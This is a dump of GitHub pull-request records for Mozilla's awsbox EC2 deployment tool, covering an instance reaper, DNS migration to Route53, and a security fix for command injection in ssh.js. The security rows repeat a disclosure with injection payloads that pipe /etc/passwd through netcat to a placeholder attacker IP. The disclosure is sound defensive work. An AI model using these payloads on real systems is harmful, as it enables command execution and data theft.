- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,f59e17ee39aa360cde70fe1fb3ba8c6111b22bd3,fix bugs in reaper.js from moving it into its own file
47,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,6d70ba190a9a019eac64df341d6d4771f10ee971,fix bugs in reaper.js from moving it into its own file
48,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,408f577cafdeb748f2c82346dd8f406ef8c037b1,add email notifications to reaper
49,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,416d61be44d490f82cd46a4d84a7361fb968aaf4,add termination code to reaper
50,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,dd78267dd19805902d3d0661dd0d8d0bc51e77a8,add spareme and nokill to awsbox.js
51,https://api.github.com/repos/mozilla/awsbox/pulls/87,87,#86 improve compatibility with EC2 CLI env. variables,,mostlygeek,83972,2013-07-19T19:55:52Z,NONE,False,5,5,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,a362381c09d4def5380b18b957978773e8adde43,#86 improve compatibility with EC2 CLI env. variables
52,https://api.github.com/repos/mozilla/awsbox/pulls/87,87,#86 improve compatibility with EC2 CLI env. variables,,mostlygeek,83972,2013-07-19T19:55:52Z,NONE,False,5,5,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,05f7bfe331143cd3bb406be611b7925fe7930bbb,#86 now usage of other env. variables actually works
53,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2ea9b2d4164084c952b6d6b1b46ab20d7cddad34,Start of the mechanical translation to AwsSum
54,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,cb1299e435ec296b32c4f0381644554d772c6f63,Change over the 'zones' command to use AwsSum
55,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,269efe9b57776b1950bfce12feef45d817ec68c1,Port both 'list' and 'test' over to AwsSum
56,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,443e84d35253e27e12e8f47001d0d6c5b95cdf78,Update the create command to use AwsSum
57,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,4f019f960e50bd175c2179007e248dbfa90b7bc5,"Fix how the clients (both ec2 and route53) are being created.

Previously, the ec2 client was being created during require('./lib/aws.js')
but this was _before_ the AWS_* env vars were being checked. This is fixed.

Also, we were also checking the valid regions async via the API but AwsSum
already knows what regions are allowed, so this is now sync."
58,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,9eadd02400117b45b7f5fee3afe91f0d9d8e3249,Add the commands listdomains and listhosts for Route53
59,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,d084588c0fffccc51ad2362f1b7e9c135eb7d854,Update the command findbyip for Route53
60,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,c48811ce62be627dc41f5670fdcdaf40372d0bfe,Move all DNS to Route53
61,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,b763fc61758e5f1408dfaabad04e445143cf3391,"Remove fmt, no longer needed"
62,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,439eb18f4f09c6b343cd94d9494facc8af761eaa,Fix the flattening of the various AWS env vars we look for
63,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,aff2c5b933540753c3d68ebeb0e988eceac9863b,First part of moving to nice-route53 : listdomains and inUse() ported
64,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,fc264b5d468ed7e866a040f5d6bf3c3cadd119cc,Convert listhosts over to nice-route53
65,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,dd799203b195f3c6ce055a7dbdf7b0933d0693d0,Update dns.findByIP() to use nice-route53
66,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,bdc12e9e9da155b39700f8b109a1a5859ce54134,Make updaterecord and deleterecord use nice-route53 and wait for the INSYNC event
67,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,15f722de4130ef62e289a00109b9f8e5945e404e,Depend on the latest release of nice-route53
68,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,4b2dfe4a001a86d9cf871852c4c7febc55aa2389,Remove code which is no longer necessary
69,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,e124fef0fa8c58f792af8086a8430adce3496243,Fix some error checking
70,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,ed32862b758788e2cb3f29d15afb15bd6b3de569,Make sure the inuse command does the right thing
71,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2efa893d2c8795814521a4acffda8a1ca7e960e0,Clarify doc for the zones command
72,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,0a3ab368fea86b6949076664a5226fcd8fe63551,Remove debugging
73,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,a3ff57825981ebdc50f7c6826f9367f171397434,add awssum and awssum-amazon to list of dependencies
74,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,0feeb1051a520c06eb2eb445bc6193df5d1998c2,Fix error reporting
75,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,3feaca355e0379f1e24e397643129e12596bd8ac,Default the ttl to 60 seconds
76,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,da268bf454a63ab455824e680795379dde75c813,Update version number and required node version
77,https://api.github.com/repos/mozilla/awsbox/pulls/75,75,Port to awssum (from aws-lib),"Fixes #63. 
",chilts,3048,2013-06-11T23:16:02Z,CONTRIBUTOR,True,128,99,5,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2ea9b2d4164084c952b6d6b1b46ab20d7cddad34,Start of the mechanical translation to AwsSum
78,https://api.github.com/repos/mozilla/awsbox/pulls/75,75,Port to awssum (from aws-lib),"Fixes #63. 
",chilts,3048,2013-06-11T23:16:02Z,CONTRIBUTOR,True,128,99,5,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,cb1299e435ec296b32c4f0381644554d772c6f63,Change over the 'zones' command to use AwsSum
79,https://api.github.com/repos/mozilla/awsbox/pulls/75,75,Port to awssum (from aws-lib),"Fixes #63. 
",chilts,3048,2013-06-11T23:16:02Z,CONTRIBUTOR,True,128,99,5,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,269efe9b57776b1950bfce12feef45d817ec68c1,Port both 'list' and 'test' over to AwsSum
80,https://api.github.com/repos/mozilla/awsbox/pulls/75,75,Port to awssum (from aws-lib),"Fixes #63. 
",chilts,3048,2013-06-11T23:16:02Z,CONTRIBUTOR,True,128,99,5,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,443e84d35253e27e12e8f47001d0d6c5b95cdf78,Update the create command to use AwsSum
81,https://api.github.com/repos/mozilla/awsbox/pulls/74,74,Use child_process.spawn instead of exec for remote script calls,"Resolves issue #69.
",spitimage,1820846,2013-06-11T15:42:16Z,CONTRIBUTOR,True,11,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2875b1bb8a381010638554523aa84f368dc0c6df,Use child_process.spawn instead of exec for remote script calls
82,https://api.github.com/repos/mozilla/awsbox/pulls/72,72,Fix typo for proxess -> process,,chilts,3048,2013-06-06T18:37:35Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,b2a853a160be2e530b4d92cb62be1b5accaa5db4,Fix typo for proxess -> process
83,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1a9d73b97a3da8d2a8bc16972477c1cc4d524628,use child_process.execFile to prevent potential command injection
84,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,d0fdce17f4b2793ed43e8269c9e6c9f19eaea822,use child_process.execFile to prevent local command injection
85,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,76b4c9991f626fc6a7c9e887ba8843a51f4c27a2,Escape pubkey to prevent local command injection
86,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,9981003899c70b0b6639591694f5be154ab44b44,Escape pubkey to prevent remote command injection on the EC2 VM
87,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,c33a75fc4ad4a1706bfc9edd3b9854e500b23d7d,"Revert ""Escape pubkey to prevent remote command injection on the EC2 VM""

This reverts commit 9981003899c70b0b6639591694f5be154ab44b44."
88,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
